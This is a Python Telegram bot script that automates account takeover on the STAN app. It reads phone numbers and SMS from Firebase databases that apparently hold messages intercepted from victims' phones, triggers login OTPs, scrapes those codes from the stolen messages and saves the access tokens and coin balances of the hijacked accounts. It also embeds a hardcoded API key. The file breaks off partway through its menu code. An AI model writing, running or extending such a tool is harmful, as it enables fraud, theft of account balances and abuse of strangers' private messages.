#!/usr/bin/env python3
"""
FKCoinHunter - Telegram Bot v3.2
Fixed: HTML escape in all dynamic content (no more 'cant parse entities')
"""

import os
import sys
import json
import logging
import threading
import time
import re
import secrets
import base64
import urllib.parse
import html as html_lib
import asyncio
from datetime import datetime
from typing import Optional, Dict, List, Set, Tuple
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
from telegram.constants import ParseMode
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============ CONFIG ============
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID_ENV = os.getenv("ADMIN_ID", "")
ADMIN_ID = int(ADMIN_ID_ENV) if ADMIN_ID_ENV else None

STAN_API_KEY = os.getenv(
    "STAN_API_KEY",
    "af3a3dbe4aeb1af819ce7657b029259324305498164ac0e37c7d614389d8b4d9"
)
STAN_API_BASE = "https://api.getstan.app"
MIN_FK_BALANCE = 10
HIT_THRESHOLD = 75
OTP_WAIT_SECONDS = 20
OTP_CHECK_INTERVAL = 3
MAX_WORKERS = 10
DATA_DIR = os.getenv("DATA_DIR", ".")
os.makedirs(DATA_DIR, exist_ok=True)

PANELS_FILE = os.path.join(DATA_DIR, "panels.json")
HITS_FILE = os.path.join(DATA_DIR, "hits.json")
ACCOUNTS_FILE = os.path.join(DATA_DIR, "stan_accounts_full.json")

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger("FKCoinHunter")

# ============ GLOBALS ============
bot_app: Optional[Application] = None
main_loop: Optional[asyncio.AbstractEventLoop] = None
admin_chat_id: Optional[int] = None

auto_status = {
    'running': False,
    'total_processed': 0, 'successful': 0, 'failed': 0,
    'no_otp': 0, 'already_registered': 0, 'hits': 0,
    'total_balance': 0, 'current_action': 'Idle',
    'recent_accounts': [], 'recent_hits': [],
    'database_url': '', 'processing_logs': [],
    'current_panel': '', 'panel_index': 0, 'total_panels': 0,
    'last_update': datetime.now().isoformat(),
    'active_workers': 0, 'batch_info': ''
}

OTP_PATTERNS = [
    {"pattern": r"(\d{4,6})\s+is the otp for mobile verification on STAN", "keyword": "stan", "priority": 1},
    {"pattern": r"STAN.*?OTP[:\s]*(\d{4,6})", "keyword": "stan", "priority": 2},
    {"pattern": r"OTP[:\s]*(\d{4,6}).*?STAN", "keyword": "stan", "priority": 3},
    {"pattern": r"(\d{4,6})\s+is your OTP for STAN", "keyword": "stan", "priority": 4},
]

# ============ HTML ESCAPE HELPER ============
def _esc(s) -> str:
    """Escape arbitrary content for Telegram HTML parse mode.
    Handles None, non-str, and any raw < > & characters."""
    if s is None:
        return ""
    return html_lib.escape(str(s))


# ============ DATA ============
@dataclass
class Account:
    phone: str
    access_token: str
    refresh_token: str
    firebase_token: str
    user_id: int
    username: str
    fk_balance: int
    device_uid: str
    user_agent: str
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    saved: bool = False
    device_id: str = ""
    firebase_url: str = ""

    def to_dict(self):
        return {
            'phone': self.phone, 'access_token': self.access_token,
            'refresh_token': self.refresh_token, 'firebase_token': self.firebase_token,
            'user_id': self.user_id, 'username': self.username,
            'fk_balance': self.fk_balance, 'device_uid': self.device_uid,
            'user_agent': self.user_agent, 'created_at': self.created_at,
            'saved': self.saved, 'device_id': self.device_id,
            'firebase_url': self.firebase_url
        }

# ============ UI HELPERS ============
def progress_bar(percent: float, length: int = 10) -> str:
    percent = max(0, min(100, percent))
    filled = int(round(percent / 100 * length))
    return "█" * filled + "░" * (length - filled)


def fmt_num(n) -> str:
    try:
        return f"{int(n):,}"
    except Exception:
        return "0"


def send_log(message: str, log_type: str = 'info'):
    entry = {
        'timestamp': datetime.now().strftime('%H:%M:%S'),
        'message': message, 'type': log_type
    }
    auto_status['processing_logs'].append(entry)
    if len(auto_status['processing_logs']) > 500:
        auto_status['processing_logs'] = auto_status['processing_logs'][-500:]
    logger.info(f"[{log_type.upper()}] {message}")


def notify_admin(text: str):
    if not admin_chat_id or not bot_app or not main_loop:
        return
    try:
        asyncio.run_coroutine_threadsafe(
            bot_app.bot.send_message(admin_chat_id, text, parse_mode=ParseMode.HTML),
            main_loop
        )
    except Exception as e:
        logger.error(f"notify_admin: {e}")


# ============ FIREBASE / OTP ============
def parse_panel_link(link: str) -> Optional[Tuple[str, str]]:
    if "?s=" in link:
        parsed = urllib.parse.urlparse(link)
        qs = urllib.parse.parse_qs(parsed.query)
        if 's' in qs:
            s = qs['s'][0] + "=" * ((4 - len(qs['s'][0]) % 4) % 4)
            try:
                decoded = base64.b64decode(s).decode('utf-8')
                for sep in ['|||', '|']:
                    if sep in decoded:
                        parts = decoded.split(sep)
                        if len(parts) >= 2:
                            url = parts[0].strip()
                            key = parts[1].strip()
                            if url and key:
                                if not url.endswith('/'):
                                    url += '/'
                                return url, key
            except Exception:
                pass
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        if not link.endswith('/'):
            link += '/'
        return link, None
    return None


def parse_urls_from_text(text: str) -> List[str]:
    urls = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        for token in re.split(r'[,\s]+', line):
            token = token.strip()
            if not token:
                continue
            if (token.startswith('http') or 'firebase' in token.lower()
                    or '?s=' in token):
                urls.append(token)
    return urls


def parse_urls_from_json(text: str) -> List[str]:
    try:
        data = json.loads(text)
        if isinstance(data, list):
            return [u.strip() for u in data if isinstance(u, str) and u.strip()]
        if isinstance(data, dict):
            for key in ('urls', 'panels', 'links'):
                if key in data and isinstance(data[key], list):
                    return [u.strip() for u in data[key]
                            if isinstance(u, str) and u.strip()]
    except Exception:
        pass
    return []


def fetch_phones_from_panel(panel: dict, limit: int = 100) -> List[Tuple[str, str]]:
    url = panel["url"]
    try:
        clients = requests.get(url + 'clients.json', timeout=5).json() or {}
    except Exception as e:
        send_log(f"❌ Fetch clients failed ({panel.get('name')}): {e}", 'error')
        return []
    phones = []
    count = 0
    for c_id, c_data in clients.items():
        if count >= limit:
            break
        if not isinstance(c_data, dict) or not c_data.get("status"):
            continue
        phone = c_data.get("mobNo") or c_data.get("phone") or c_data.get("mobile")
        if not phone:
            try:
                r = requests.get(f"{url}messages/{c_id}.json", timeout=3)
                if r.status_code == 200:
                    for msg in (r.json() or {}).values():
                        if isinstance(msg, dict):
                            txt = str(msg.get("body") or msg.get("message")
                                      or msg.get("text") or "")
                            m = re.search(r'\b([6-9]\d{9})\b', txt)
                            if m:
                                phone = m.group(1)
                                break
            except Exception:
                pass
        if phone:
            phone = re.sub(r'\D', '', phone)
            if len(phone) == 10 and phone[0] in "6789":
                phones.append((phone, c_id))
                count += 1
    return phones


def fetch_messages_for_device(firebase_url: str, device_id: str) -> List[Dict]:
    if not firebase_url or not device_id:
        return []
    try:
        r = requests.get(f"{firebase_url}messages/{device_id}.json", timeout=5)
        if r.status_code != 200:
            return []
        msgs = r.json()
        if not msgs:
            return []
        sorted_msgs = sorted(
            msgs.items(),
            key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0,
            reverse=True
        )
        out = []
        for mid, md in sorted_msgs[:5]:
            if isinstance(md, dict):
                out.append({
                    'sender': md.get('sender', 'Unknown'),
                    'text': md.get('body') or md.get('message') or md.get('text', ''),
                    'timestamp': mid
                })
        return out
    except Exception as e:
        send_log(f"Error fetching msgs ({device_id}): {e}", 'error')
        return []


def poll_otp_from_panel(firebase_url, device_id,
                        sender_keyword="STAN",
                        timeout=OTP_WAIT_SECONDS) -> Optional[str]:
    start = time.time()
    trigger = int(time.time() * 1000)
    while time.time() - start < timeout:
        try:
            r = requests.get(f"{firebase_url}messages/{device_id}.json", timeout=3)
            if r.status_code != 200:
                time.sleep(1)
                continue
            msgs = r.json()
            if not msgs:
                time.sleep(1)
                continue
            for mid in sorted(msgs.keys(), reverse=True):
                md = msgs[mid]
                if not isinstance(md, dict):
                    continue
                try:
                    if int(mid) < trigger:
                        continue
                except Exception:
                    continue
                sender = md.get("sender", "")
                body = md.get("body") or md.get("message") or md.get("text") or ""
                if sender_keyword.lower() in sender.lower():
                    for pc in OTP_PATTERNS:
                        if pc["keyword"] and pc["keyword"].lower() not in body.lower():
                            continue
                        m = re.search(pc["pattern"], body, re.IGNORECASE)
                        if m:
                            otp = m.group(1)
                            if 4 <= len(otp) <= 6:
                                return otp
                    m = re.search(r'(?<!\d)(\d{4}|\d{6})(?!\d)', body)
                    if m:
                        return m.group(0)
            time.sleep(1)
        except Exception:
            time.sleep(1)
    return None


# ============ STAN API ============
def format_phone(phone):
    phone = re.sub(r'[^0-9+]', '', phone.strip())
    if phone.startswith('+91') and len(phone) == 13:
        return phone
    if phone.startswith('0'):
        phone = phone[1:]
    if phone.startswith('91'):
        return '+' + phone if len(phone) == 12 else '+91' + phone
    if len(phone) == 10:
        return '+91' + phone
    return f"+91{phone[-10:]}" if len(phone) >= 10 else f"+91{phone}"


def send_stan_otp(phone, ua):
    try:
        r = requests.post(
            f"{STAN_API_BASE}/api/v1/auth/otp/store/send",
            headers={
                "x-api-key": STAN_API_KEY, "appversion": "500",
                "platform": "android", "user-agent": ua,
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "origin": "https://www.stanshop.co",
                "x-requested-with": "mark.via.gp",
            },
            json={"phone": phone}, timeout=30
        )
        if r.status_code == 200:
            d = r.json()
            if d.get("statusCode") == 10047 or "already" in str(d).lower():
                return {"success": False, "already_registered": True}
            return {"success": True, "data": d}
        return {"success": False, "error": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def verify_stan_otp(phone, otp, ua, uid):
    try:
        r = requests.post(
            f"{STAN_API_BASE}/api/v4/store/verify/otp",
            headers={
                "x-api-key": STAN_API_KEY, "appversion": "500",
                "platform": "android", "user-agent": ua,
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "origin": "https://www.stanshop.co",
                "x-requested-with": "mark.via.gp",
                "referer": "https://www.stanshop.co/",
            },
            json={
                "phone": phone, "otp": otp, "sessionId": None,
                "deviceInfo": {"APP_TYPE": "android",
                               "DeviceData": {"deviceUID": uid}},
                "utmPayload": {}, "campaignUrl": ""
            }, timeout=60
        )
        if r.status_code == 200:
            d = r.json()
            if d.get("access_token"):
                return {
                    'success': True,
                    'access_token': d["access_token"],
                    'refresh_token': d.get("refresh_token", ''),
                    'firebase_token': d.get("firebase_token", ''),
                    'user_data': d.get("user", {})
                }
            if d.get("message") == "Invalid OTP":
                return {'success': False, 'error': 'Invalid OTP'}
        if r.status_code == 400:
            return {'success': False, 'error': 'HTTP 400 - Bad Request'}
        return {'success': False, 'error': f'HTTP {r.status_code}'}
    except Exception as e:
        return {'success': False, 'error': str(e)}


def get_stan_balance(tok, ua):
    if not tok:
        return 0
    try:
        r = requests.get(
            f"{STAN_API_BASE}/api/v1/shop/client/balance?vendor=all",
            headers={
                "x-api-key": STAN_API_KEY, "appversion": "500",
                "platform": "android", "user-agent": ua,
                "accept": "application/json, text/plain, */*",
                "authorization": f"Bearer {tok}", "countrycode": "IN"
            }, timeout=30
        )
        if r.status_code == 200:
            d = r.json()
            if d.get("statusCode") == 200:
                return d.get("message", {}).get("fkcoin_balance", 0) or 0
    except Exception:
        pass
    return 0


# ============ MANAGERS ============
class DatabaseManager:
    def __init__(self):
        self.panels = []
        self.current_panel_index = 0
        self._load()

    def _load(self):
        if os.path.exists(PANELS_FILE):
            try:
                d = json.load(open(PANELS_FILE, 'r', encoding='utf-8'))
                self.panels = d.get('panels', [])
                self.current_panel_index = d.get('current_index', 0)
                auto_status['total_panels'] = len(self.panels)
                auto_status['panel_index'] = self.current_panel_index + 1
            except Exception as e:
                logger.error(f"load panels: {e}")

    def _save(self):
        try:
            json.dump({
                'panels': self.panels,
                'current_index': self.current_panel_index,
                'last_updated': datetime.now().isoformat()
            }, open(PANELS_FILE, 'w', encoding='utf-8'), indent=2)
        except Exception as e:
            logger.error(f"save panels: {e}")

    def add_databases(self, urls: List[str]) -> Tuple[int, int]:
        added = failed = 0
        for url in urls:
            url = url.strip()
            if not url:
                continue
            parsed = parse_panel_link(url)
            if not parsed:
                failed += 1
                continue
            fburi, key = parsed
            name = (fburi.replace("https://", "").replace("http://", "")
                    .split('.')[0] or f"Panel_{len(self.panels)+1}")
            panel = {"name": name, "url": fburi, "api_key": key, "sender": "STAN"}
            if panel not in self.panels:
                self.panels.append(panel)
                added += 1
            else:
                failed += 1
        self._save()
        auto_status['total_panels'] = len(self.panels)
        return added, failed

    def get_databases(self):
        return [p.get('url', '') for p in self.panels]

    def get_current_db(self):
        if self.panels and 0 <= self.current_panel_index < len(self.panels):
            return self.panels[self.current_panel_index].get('url')
        return None

    def set_current_db(self, i):
        if 0 <= i < len(self.panels):
            self.current_panel_index = i
            self._save()
            auto_status['panel_index'] = i + 1
            auto_status['current_panel'] = self.panels[i].get('name', '')
            return True
        return False

    def remove_database(self, i):
        if 0 <= i < len(self.panels):
            self.panels.pop(i)
            if self.current_panel_index >= len(self.panels):
                self.current_panel_index = max(0, len(self.panels) - 1)
            self._save()
            auto_status['total_panels'] = len(self.panels)
            auto_status['panel_index'] = self.current_panel_index + 1
            return True
        return False

    def get_current_panel(self):
        if self.panels and 0 <= self.current_panel_index < len(self.panels):
            return self.panels[self.current_panel_index]
        return None

    def get_panels(self):
        return self.panels.copy()

    def move_to_next_panel(self):
        if not self.panels:
            return False
        return self.set_current_db((self.current_panel_index + 1) % len(self.panels))


class HitManager:
    def __init__(self):
        self.hits = []
        self._load()

    def _load(self):
        if os.path.exists(HITS_FILE):
            try:
                self.hits = json.load(open(HITS_FILE, 'r', encoding='utf-8'))
            except Exception as e:
                logger.error(f"load hits: {e}")

    def _save(self):
        try:
            json.dump(self.hits, open(HITS_FILE, 'w', encoding='utf-8'),
                      indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"save hits: {e}")

    def add_hit(self, account, messages, fburi, dev_id) -> bool:
        if any(h.get('phone') == account.phone for h in self.hits):
            return False
        self.hits.append({
            'phone': account.phone,
            'username': account.username,
            'fk_balance': account.fk_balance,
            'user_id': account.user_id,
            'device_uid': account.device_uid,
            'created_at': account.created_at,
            'access_token': (account.access_token[:50] + '...') if account.access_token else '',
            'firebase_url': fburi,
            'device_id': dev_id,
            'messages': messages or []
        })
        self._save()
        return True

    def get_hits(self):
        return self.hits.copy()

    def get_hit_by_phone(self, phone):
        for i, h in enumerate(self.hits):
            if h.get('phone') == phone:
                return i, h.copy()
        return -1, None

    def refresh_messages_by_phone(self, phone):
        for i, h in enumerate(self.hits):
            if h.get('phone') == phone:
                msgs = fetch_messages_for_device(
                    h.get('firebase_url', ''),
                    h.get('device_id', '')
                )
                self.hits[i]['messages'] = msgs
                self._save()
                return self.hits[i].copy()
        return None


class AccountManager:
    def __init__(self):
        self.accounts = []
        self.processed_numbers = set()
        self.successful_numbers = set()
        self.failed_numbers = set()
        self.no_otp_numbers = set()
        self.stats = {
            'total_processed': 0, 'successful': 0, 'failed': 0,
            'no_otp': 0, 'already_registered': 0, 'skipped': 0,
            'total_balance': 0, 'saved_accounts': 0, 'hits': 0,
            'http_400_errors': 0
        }
        self._lock = threading.Lock()
        self.processed_lock = threading.Lock()
        self.hit_manager = HitManager()
        self._load()

    def _load(self):
        if os.path.exists(ACCOUNTS_FILE):
            try:
                for d in json.load(open(ACCOUNTS_FILE, 'r', encoding='utf-8')):
                    if d.get('phone'):
                        acc = Account(
                            phone=d.get('phone', ''),
                            access_token=d.get('access_token', ''),
                            refresh_token=d.get('refresh_token', ''),
                            firebase_token=d.get('firebase_token', ''),
                            user_id=d.get('user_id', 0),
                            username=d.get('username', 'User'),
                            fk_balance=d.get('fk_balance', 0) or 0,
                            device_uid=d.get('device_uid', ''),
                            user_agent=d.get('user_agent', ''),
                            created_at=d.get('created_at', datetime.now().isoformat()),
                            saved=d.get('saved', False),
                            device_id=d.get('device_id', ''),
                            firebase_url=d.get('firebase_url', '')
                        )
                        self.accounts.append(acc)
                        self.successful_numbers.add(acc.phone)
                        self.processed_numbers.add(acc.phone)
                        if acc.fk_balance >= HIT_THRESHOLD:
                            self.stats['hits'] += 1
            except Exception as e:
                logger.error(f"load accounts: {e}")

    def _append(self, acc: Account):
        try:
            data = []
            if os.path.exists(ACCOUNTS_FILE):
                data = json.load(open(ACCOUNTS_FILE, 'r', encoding='utf-8'))
            data.append(acc.to_dict())
            json.dump(data, open(ACCOUNTS_FILE, 'w', encoding='utf-8'),
                      indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"save account: {e}")

    def add_account(self, acc, messages=None, fburi=None, dev_id=None) -> bool:
        with self._lock:
            if any(e.phone == acc.phone for e in self.accounts):
                return False
            acc.device_id = dev_id or ""
            acc.firebase_url = fburi or ""
            self.accounts.append(acc)
            self.successful_numbers.add(acc.phone)
            self.processed_numbers.add(acc.phone)
            self.stats['successful'] += 1
            if acc.fk_balance >= MIN_FK_BALANCE:
                acc.saved = True
                self.stats['saved_accounts'] += 1
            self.stats['total_balance'] += acc.fk_balance or 0
            if acc.fk_balance >= HIT_THRESHOLD:
                self.stats['hits'] += 1
                self.hit_manager.add_hit(acc, messages or [], fburi or "", dev_id or "")
                auto_status['hits'] = self.stats['hits']
                notify_admin(
                    f"⭐ <b>NEW HIT</b>\n"
                    f"📱 <code>{_esc(acc.phone)}</code>\n"
                    f"💰 <b>{acc.fk_balance} FK</b>\n"
                    f"👤 {_esc(acc.username)}"
                )
            self._append(acc)
            return True

    def mark_processed(self, phone):
        with self.processed_lock:
            if phone not in self.processed_numbers:
                self.processed_numbers.add(phone)
                self.stats['total_processed'] += 1
                auto_status['total_processed'] = self.stats['total_processed']

    def mark_failed(self, phone, reason='Unknown'):
        with self._lock:
            self.failed_numbers.add(phone)
            self.stats['failed'] += 1
            auto_status['failed'] = self.stats['failed']

    def mark_no_otp(self, phone):
        with self._lock:
            self.no_otp_numbers.add(phone)
            self.stats['no_otp'] += 1
            auto_status['no_otp'] = self.stats['no_otp']

    def is_processed(self, phone):
        with self.processed_lock:
            return (phone in self.processed_numbers
                    or phone in self.successful_numbers)

    def get_accounts(self):
        return [a.to_dict() for a in self.accounts]

    def get_stats(self):
        return self.stats.copy()


# ============ AUTOMATION ============
class AutomationWorker:
    def __init__(self, am: AccountManager, dm: DatabaseManager):
        self.am = am
        self.dm = dm
        self.running = False
        self.thread = None
        self.executor = None
        self.failed_count = 0
        self.processed_count = 0
        self.lock = threading.Lock()

    def start(self):
        with self.lock:
            if self.running:
                return False
            self.running = True
            self.failed_count = 0
            self.processed_count = 0
            self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
            self.thread = threading.Thread(target=self._run, daemon=True)
            self.thread.start()
        send_log(f"🔄 Automation started ({MAX_WORKERS} workers)", 'success')
        auto_status['running'] = True
        notify_admin(f"🚀 <b>Automation Started</b> • {MAX_WORKERS} workers")
        return True

    def stop(self):
        with self.lock:
            self.running = False
            if self.executor:
                self.executor.shutdown(wait=False)
        send_log("⏹ Stopped", 'warning')
        auto_status['running'] = False
        auto_status['active_workers'] = 0
        auto_status['current_action'] = 'Idle'
        auto_status['batch_info'] = ''
        notify_admin("⏹ <b>Automation Stopped</b>")

    def _move_next_panel(self):
        panels = self.dm.get_panels()
        if not panels:
            return False
        nxt = (self.dm.current_panel_index + 1) % len(panels)
        if self.dm.set_current_db(nxt):
            name = self.dm.get_current_panel().get('name', '?')
            send_log(f"🔄 Switched to Panel {nxt+1}/{len(panels)}: {name}", 'info')
            auto_status['database_url'] = self.dm.get_current_db()
            auto_status['current_panel'] = name
            auto_status['panel_index'] = nxt + 1
            self.failed_count = 0
            self.processed_count = 0
            return True
        return False

    def _run(self):
        while self.running:
            try:
                panels = self.dm.get_panels()
                if not panels:
                    send_log("⚠️ No panels. Add one via /addpanel", 'warning')
                    time.sleep(10)
                    continue

                panel = self.dm.get_current_panel()
                if not panel or panel not in panels:
                    self.dm.set_current_db(0)
                    panel = self.dm.get_current_panel()
                    if not panel:
                        time.sleep(5)
                        continue

                fburi = panel.get("url")
                sender = panel.get("sender", "STAN")
                idx = self.dm.current_panel_index
                total = len(panels)
                name = panel.get('name', '?')

                auto_status['current_panel'] = name
                auto_status['panel_index'] = idx + 1
                auto_status['total_panels'] = total
                auto_status['database_url'] = fburi
                auto_status['current_action'] = f'Fetching {name}'

                send_log(f"📡 Panel {idx+1}/{total}: {name}", 'info')
                devices = fetch_phones_from_panel(panel, limit=100)

                if not devices:
                    send_log(f"⚠️ No devices in {name}. Moving on…", 'warning')
                    self._move_next_panel()
                    time.sleep(2)
                    continue

                send_log(f"📋 {len(devices)} devices in {name}", 'info')

                available = [(p, d) for p, d in devices if not self.am.is_processed(p)]
                if not available:
                    send_log(f"✅ All processed in {name}. Next.", 'success')
                    self._move_next_panel()
                    time.sleep(2)
                    continue

                total_avail = len(available)
                send_log(f"🆕 {total_avail} new devices", 'info')

                processed_total = 0
                failed_total = 0
                batch_num = 1

                while processed_total < total_avail and self.running:
                    start = processed_total
                    end = min(processed_total + MAX_WORKERS, total_avail)
                    batch = available[start:end]

                    auto_status['batch_info'] = f"Batch {batch_num} • {len(batch)} devices"
                    send_log(
                        f"🚀 Batch {batch_num}: {len(batch)} devices "
                        f"(remaining {total_avail - processed_total})", 'info'
                    )

                    futures = []
                    for phone, dev in batch:
                        if not self.running:
                            break
                        futures.append(self.executor.submit(
                            self._process_device, phone, dev, fburi, sender
                        ))
                    auto_status['active_workers'] = len([f for f in futures if not f.done()])

                    batch_ok = batch_fail = 0
                    for fut in as_completed(futures):
                        try:
                            ok = fut.result(timeout=120)
                            if ok:
                                batch_ok += 1
                                self.processed_count += 1
                                self.failed_count = 0
                            else:
                                batch_fail += 1
                                self.failed_count += 1
                        except Exception as e:
                            batch_fail += 1
                            self.failed_count += 1
                            send_log(f"❌ Worker error: {e}", 'error')
                        processed_total += 1
                        auto_status['active_workers'] = len([f for f in futures if not f.done()])

                    batch_num += 1
                    failed_total += batch_fail
                    auto_status['active_workers'] = 0
                    auto_status['batch_info'] = ''
                    send_log(f"📊 Batch {batch_num-1} done: {batch_ok}✅ {batch_fail}❌", 'info')

                    if self.failed_count >= 10:
                        send_log(f"⚠️ 10 consecutive fails in {name}. Cycling.", 'warning')
                        break

                    if processed_total < total_avail:
                        time.sleep(2)

                send_log(
                    f"📊 Panel {name} complete: {processed_total - failed_total}✅ "
                    f"{failed_total}❌ / {total_avail}", 'info'
                )
                self._move_next_panel()
                auto_status['current_action'] = 'Idle'
                time.sleep(2)

            except Exception as e:
                send_log(f"❌ Worker loop error: {e}", 'error')
                self._move_next_panel()
                time.sleep(5)

        auto_status['current_action'] = 'Idle'
        auto_status['active_workers'] = 0
        auto_status['batch_info'] = ''

    def _process_device(self, phone, dev_id, fburi, sender):
        if self.am.is_processed(phone):
            return False
        self.am.mark_processed(phone)

        try:
            formatted = format_phone(phone)
            wid = threading.current_thread().name
            ua = "Mozilla/5.0 (Linux; Android 14; SM-A065F) AppleWebKit/537.36"
            uuid = secrets.token_hex(8)

            otp_resp = send_stan_otp(formatted, ua)
            if otp_resp.get("already_registered"):
                send_log(f"[{wid}] ⚠️ {formatted} already registered", 'warning')
                self.am.stats['already_registered'] += 1
                self.am.mark_failed(phone, 'Already registered')
                return False
            if not otp_resp.get("success"):
                send_log(f"[{wid}] ❌ {formatted} OTP request failed", 'error')
                self.am.mark_failed(phone, 'OTP request failed')
                return False

            send_log(f"[{wid}] ✅ OTP sent to {formatted}", 'success')
            otp = poll_otp_from_panel(fburi, dev_id, sender, OTP_WAIT_SECONDS)
            if not otp:
                send_log(f"[{wid}] ⏰ {formatted} no OTP", 'warning')
                self.am.mark_no_otp(phone)
                self.am.mark_failed(phone, 'No OTP')
                return False
            send_log(f"[{wid}] 🔑 {formatted} OTP: {otp}", 'success')

            v = verify_stan_otp(formatted, otp, ua, uuid)
            if not v.get('success'):
                err = v.get('error', 'verify failed')
                send_log(f"[{wid}] ❌ {formatted}: {err}", 'error')
                if "400" in err:
                    self.am.stats['http_400_errors'] += 1
                self.am.mark_failed(phone, 'Verify failed')
                return False

            tok = v['access_token']
            rtok = v.get('refresh_token', '')
            ftok = v.get('firebase_token', '')
            ud = v.get('user_data', {})
            uname = ud.get('username', 'User')
            uid = ud.get('id', 0)

            balance = get_stan_balance(tok, ua) or 0
            messages = fetch_messages_for_device(fburi, dev_id)

            acc = Account(
                phone=formatted, access_token=tok,
                refresh_token=rtok, firebase_token=ftok,
                user_id=uid, username=uname, fk_balance=balance,
                device_uid=uuid, user_agent=ua,
                created_at=datetime.now().isoformat(),
                saved=(balance >= MIN_FK_BALANCE),
                device_id=dev_id, firebase_url=fburi
            )
            self.am.add_account(acc, messages, fburi, dev_id)
            auto_status['successful'] = self.am.stats['successful']
            auto_status['total_balance'] = self.am.stats['total_balance']
            auto_status['hits'] = self.am.stats['hits']

            is_hit = balance >= HIT_THRESHOLD
            if is_hit:
                send_log(f"[{wid}] ⭐ HIT {formatted} | {balance} FK | {uname}", 'hit')
                auto_status['recent_hits'].append({
                    'phone': formatted, 'balance': balance,
                    'username': uname,
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                auto_status['recent_hits'] = auto_status['recent_hits'][-10:]
            else:
                send_log(f"[{wid}] ✅ {formatted} | {balance} FK | {uname}", 'success')

            auto_status['recent_accounts'].append({
                'phone': formatted, 'balance': balance, 'username': uname,
                'is_hit': is_hit, 'time': datetime.now().strftime('%H:%M:%S')
            })
            auto_status['recent_accounts'] = auto_status['recent_accounts'][-20:]
            return True

        except Exception as e:
            send_log(f"❌ Error on {phone}: {e}", 'error')
            self.am.mark_failed(phone, str(e))
            return False


# ============ INSTANCES ============
am = AccountManager()
dm = DatabaseManager()
worker = AutomationWorker(am, dm)


# ============ UI BUILDERS ============
def main_menu_kb():
    running = auto_status['running']
    toggle = "⏹ Stop Automation" if running else "▶️ Start Automation"
    toggle_cb = "stop_auto" if running else "start_auto"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(toggle, callback_data=toggle_cb)],
        [InlineKeyboardButton("📊 Status", callback_data="status"),
         InlineKeyboardButton("📜 Logs", callback_data="logs_menu")],
        [InlineKeyboardButton("📡 Panels", callback_data="panels_menu"),
         InlineKeyboardButton("⭐ Hits", callback_data="hits_menu")],
        [InlineKeyboardButton("👤 Accounts", callback_data="accounts_menu"),
         InlineKeyboardButton("📤 Export", callback_data="export_menu")],
        [InlineKeyboardButton("❓ Help", callback_data="help_menu")],
    ])


def status_text() -> str:
    s = auto_status
    st = am.get_stats()
    icon = "🟢" if s['running'] else "🔴"
    state = "Running" if s['running'] else "Idle"
    processed = st['total_processed'] or 1
    success_pct = (st['successful'] / processed) * 100
    fail_pct = (st['failed'] / processed) * 100
    worker_pct = (s['active_workers'] / MAX_WORKERS) * 100
    panels_total = s.get('total_panels', 0)
    panels_idx = s.get('panel_index', 0)
    panel_line = f"{panels_idx}/{panels_total}" if panels_total else "0/0"

    recent_hits = ""
    if s.get('recent_hits'):
        recent_hits = "\n\n🔥 <b>Recent Hits</b>\n" + "\n".join(
            f"• <code>{_esc(h['phone'])}</code> — <b>{h['balance']} FK</b> "
            f"<i>({_esc(h['time'])})</i>"
            for h in s['recent_hits'][-3:]
        )

    return (
        f"{icon} <b>FKCoinHunter</b> • <b>{state}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📡 <b>Panel {panel_line}</b> — {_esc(s.get('current_panel') or '—')}\n"
        f"⚙️ <b>Action:</b> {_esc(s.get('current_action', 'Idle'))}\n"
        f"📦 <b>Batch:</b> {_esc(s.get('batch_info') or '—')}\n"
        f"👷 <b>Workers:</b> {s.get('active_workers', 0)}/{MAX_WORKERS} "
        f"{progress_bar(worker_pct)}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>Session Stats</b>\n"
        f"├ 📥 Processed: <b>{fmt_num(st['total_processed'])}</b>\n"
        f"├ ✅ Success: <b>{fmt_num(st['successful'])}</b> ({success_pct:.0f}%)\n"
        f"├ ❌ Failed: <b>{fmt_num(st['failed'])}</b> ({fail_pct:.0f}%)\n"
        f"├ ⏰ No OTP: <b>{fmt_num(st['no_otp'])}</b>\n"
        f"├ ⚠️ Already: <b>{fmt_num(st['already_registered'])}</b>\n"
        f"└ 💰 Total: <b>{fmt_num(st['total_balance'])} FK</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"⭐ <b>Hits:</b> {fmt_num(st['hits'])} (≥ {HIT_THRESHOLD} FK)\n"
        f"💾 <b>Saved:</b> {fmt_num(st['saved_accounts'])} (≥ {MIN_FK_BALANCE} FK)\n"
        f"🕒 <i>Updated {_esc(s.get('last_update','')[11:19])}</i>"
        f"{recent_hits}"
    )


def panels_kb():
    kb = []
    panels = dm.get_panels()
    for i, p in enumerate(panels):
        active = i == dm.current_panel_index
        marker = "🟢" if active else "⚪"
        kb.append([
            InlineKeyboardButton(f"{marker} {i+1}. {p.get('name','?')}",
                                 callback_data=f"panel_view_{i}"),
            InlineKeyboardButton("🗑", callback_data=f"panel_del_confirm_{i}")
        ])
    if not panels:
        kb.append([InlineKeyboardButton("➕ Add your first panel",
                                        callback_data="panel_add")])
    else:
        kb.append([InlineKeyboardButton("➕ Add Panel", callback_data="panel_add"),
                   InlineKeyboardButton("⏭ Next", callback_data="panel_next")])
        kb.append([InlineKeyboardButton("🔍 Fetch Devices", callback_data="panel_fetch"),
                   InlineKeyboardButton("🗑 Clear All", callback_data="panel_clear_all")])
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="menu")])
